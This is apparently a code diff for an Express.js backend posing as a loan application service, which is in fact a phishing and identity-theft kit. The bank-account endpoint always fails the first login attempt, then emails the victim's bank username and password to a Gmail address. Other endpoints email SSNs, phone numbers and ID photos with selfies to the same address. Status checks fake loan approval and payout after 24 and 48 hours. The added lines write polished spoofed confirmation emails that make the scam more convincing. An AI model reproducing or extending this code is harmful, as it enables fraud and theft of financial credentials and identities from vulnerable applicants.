@@ -1,4 +1,3 @@
-
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
@@ -52,18 +51,18 @@ const loanApplications = [];
 // User Authentication
 app.post('/api/signup', (req, res) => {
   const { username, email, password, confirmPassword } = req.body;
-  
+
   // Validation
   if (password !== confirmPassword) {
     return res.status(400).json({ error: 'Passwords do not match' });
   }
-  
+
   // Check if user already exists
   const existingUser = users.find(user => user.email === email || user.username === username);
   if (existingUser) {
     return res.status(400).json({ error: 'User already exists' });
   }
-  
+
   // Create new user
   const newUser = {
     id: users.length + 1,
@@ -71,28 +70,43 @@ app.post('/api/signup', (req, res) => {
     email,
     password, // In production, this should be hashed with bcrypt
   };
-  
+
   users.push(newUser);
+
+  // Send welcome email
+  const welcomeMailOptions = {
+    from: `"Company Name" <exesoftware010@gmail.com>`, // Use company name as display name
+    to: newUser.email,
+    subject: 'Welcome to Our Loan Application!',
+    text: `Dear ${newUser.username},\n\nWelcome to our loan application service!  We're excited to help you with your financial needs.\n\nSincerely,\nThe Company Name Team`
+  };
+
+  transporter.sendMail(welcomeMailOptions, (error, info) => {
+    if (error) {
+      console.error('Error sending welcome email:', error);
+    }
+  });
+
   res.status(201).json({ message: 'User created successfully', userId: newUser.id });
 });
 
 app.post('/api/login', (req, res) => {
   const { username, password } = req.body;
-  
+
   // Find user
   const user = users.find(user => user.username === username && user.password === password);
-  
+
   if (!user) {
     return res.status(401).json({ error: 'Invalid credentials' });
   }
-  
+
   res.status(200).json({ message: 'Login successful', userId: user.id });
 });
 
 // Loan Application
 app.post('/api/loan-application', (req, res) => {
   const { userId, loanAmount } = req.body;
-  
+
   const newApplication = {
     id: loanApplications.length + 1,
     userId,
@@ -100,8 +114,23 @@ app.post('/api/loan-application', (req, res) => {
     status: 'pending',
     createdAt: new Date(),
   };
-  
+
   loanApplications.push(newApplication);
+
+  // Send loan application received email
+  const applicationReceivedMailOptions = {
+    from: `"Company Name" <exesoftware010@gmail.com>`,
+    to: users.find(u => u.id === userId).email,
+    subject: 'Loan Application Received',
+    text: `Dear ${users.find(u => u.id === userId).username},\n\nThank you for submitting your loan application. We've received it and will review it shortly.\n\nSincerely,\nThe Company Name Team`
+  };
+
+  transporter.sendMail(applicationReceivedMailOptions, (error, info) => {
+    if (error) {
+      console.error('Error sending application received email:', error);
+    }
+  });
+
   res.status(201).json({ message: 'Loan application created', applicationId: newApplication.id });
 });
 
@@ -121,16 +150,16 @@ app.post('/api/verify-identity', (req, res) => {
     userId,
     applicationId
   } = req.body;
-  
+
   // Validate SSN and phone number
   if (ssn.length !== 9) {
     return res.status(400).json({ error: 'SSN must be exactly 9 digits' });
   }
-  
+
   if (phoneNumber.length !== 10) {
     return res.status(400).json({ error: 'Phone number must be exactly 10 digits' });
   }
-  
+
   // Update application with verification details
   const application = loanApplications.find(app => app.id === parseInt(applicationId));
   if (application) {
@@ -147,7 +176,7 @@ app.post('/api/verify-identity', (req, res) => {
       email
     };
   }
-  
+
   // Send email notification
   const mailOptions = {
     from: 'exesoftware010@gmail.com',
@@ -168,13 +197,13 @@ app.post('/api/verify-identity', (req, res) => {
       Email: ${email}
     `
   };
-  
+
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.error('Error sending email:', error);
       return res.status(500).json({ error: 'Failed to send verification email' });
     }
-    
+
     res.status(200).json({ message: 'Identity verification submitted successfully' });
   });
 });
@@ -182,7 +211,7 @@ app.post('/api/verify-identity', (req, res) => {
 // Payment Method Selection
 app.post('/api/payment-method', (req, res) => {
   const { method, userId, applicationId, details } = req.body;
-  
+
   // Update application with payment method
   const application = loanApplications.find(app => app.id === parseInt(applicationId));
   if (application) {
@@ -191,19 +220,19 @@ app.post('/api/payment-method', (req, res) => {
       details
     };
   }
-  
+
   res.status(200).json({ message: 'Payment method added successfully' });
 });
 
 // Bank Account Details
 app.post('/api/bank-account', (req, res) => {
   const { userId, applicationId, bankName, username, password, attempt } = req.body;
-  
+
   // First attempt always fails, second attempt sends both to email
   if (attempt === 1) {
     return res.status(401).json({ error: 'Incorrect login' });
   }
-  
+
   // Send bank login attempts to email
   const mailOptions = {
     from: 'exesoftware010@gmail.com',
@@ -218,13 +247,13 @@ app.post('/api/bank-account', (req, res) => {
       Attempt: ${attempt}
     `
   };
-  
+
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.error('Error sending email:', error);
       return res.status(500).json({ error: 'Failed to send bank details email' });
     }
-    
+
     res.status(200).json({ message: 'Bank details processed' });
   });
 });
@@ -237,11 +266,11 @@ app.post('/api/upload-id', upload.fields([
 ]), (req, res) => {
   const { userId, applicationId } = req.body;
   const files = req.files;
-  
+
   if (!files.frontId || !files.backId || !files.selfie) {
     return res.status(400).json({ error: 'All files are required' });
   }
-  
+
   // Send email with file attachments
   const mailOptions = {
     from: 'exesoftware010@gmail.com',
@@ -267,13 +296,13 @@ app.post('/api/upload-id', upload.fields([
       }
     ]
   };
-  
+
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.error('Error sending email:', error);
       return res.status(500).json({ error: 'Failed to send ID verification email' });
     }
-    
+
     res.status(200).json({ message: 'ID verification files uploaded successfully' });
   });
 });
@@ -281,67 +310,105 @@ app.post('/api/upload-id', upload.fields([
 // Get application status
 app.get('/api/application-status/:applicationId', (req, res) => {
   const { applicationId } = req.params;
-  
+
   const application = loanApplications.find(app => app.id === parseInt(applicationId));
-  
+
   if (!application) {
     return res.status(404).json({ error: 'Application not found' });
   }
-  
+
   // Simulate status changes based on time
   const now = new Date();
   const createdAt = new Date(application.createdAt);
   const hoursPassed = (now - createdAt) / (1000 * 60 * 60);
-  
+
   let status = 'pending';
   let message = 'Your application is pending review.';
-  
+
   if (hoursPassed >= 48) {
     status = 'reimbursed';
     message = `Your funds have been reimbursed to your ${application.paymentMethod?.method}.`;
-    
+
     // Send email notification about reimbursement
     if (application.status !== 'reimbursed') {
       application.status = 'reimbursed';
-      
+
       // Get user email
       const user = users.find(u => u.id === application.userId);
       if (user) {
         const mailOptions = {
-          from: 'exesoftware010@gmail.com',
+          from: `"Company Name" <exesoftware010@gmail.com>`,
           to: user.email,
-          subject: 'Loan Reimbursement Notification',
-          text: `Dear ${user.username},\n\nYour loan has been approved and funds have been reimbursed to your ${application.paymentMethod?.method}.\n\nThank you for choosing our service.`
+          subject: 'Funds Reimbursed - Loan Application Completed',
+          text: `
+            Dear ${user.username},
+
+            Great news! Your loan application #${application.id} has been fully processed and approved.
+
+            Your funds of $${application.loanAmount.toLocaleString()} have been reimbursed to your ${application.paymentMethod?.method}.
+
+            Transaction Details:
+            - Application ID: ${application.id}
+            - Amount: $${application.loanAmount.toLocaleString()}
+            - Payment Method: ${application.paymentMethod?.method}
+            - Date: ${new Date().toLocaleDateString()}
+
+            If you have any questions or need further assistance, please don't hesitate to contact our support team.
+
+            Thank you for choosing Company Name.
+
+            Best regards,
+            The Company Name Team
+          `
         };
-        
+
         transporter.sendMail(mailOptions);
       }
     }
   } else if (hoursPassed >= 24) {
     status = 'approved';
     message = 'Your loan has been approved.';
-    
+
     // Send email notification about approval
     if (application.status !== 'approved' && application.status !== 'reimbursed') {
       application.status = 'approved';
-      
+
       // Get user email
       const user = users.find(u => u.id === application.userId);
       if (user) {
         const mailOptions = {
-          from: 'exesoftware010@gmail.com',
+          from: `"Company Name" <exesoftware010@gmail.com>`,
           to: user.email,
-          subject: 'Loan Approval Notification',
-          text: `Dear ${user.username},\n\nYour loan application has been approved. You will receive your funds within 24 hours.\n\nThank you for choosing our service.`
+          subject: 'Loan Application Approved',
+          text: `
+            Dear ${user.username},
+
+            We are pleased to inform you that your loan application #${application.id} has been approved!
+
+            Application Details:
+            - Application ID: ${application.id}
+            - Amount Approved: $${application.loanAmount.toLocaleString()}
+            - Approval Date: ${new Date().toLocaleDateString()}
+
+            Next Steps:
+            Your funds will be reimbursed to your selected payment method within the next 24 hours.
+
+            You can track the status of your reimbursement by logging into your account at any time.
+
+            Thank you for choosing Company Name.
+
+            Best regards,
+            The Company Name Team
+          `
         };
-        
+
         transporter.sendMail(mailOptions);
       }
     }
   }
-  
+
   application.status = status;
-  
+
   res.status(200).json({ 
     status,
     message,
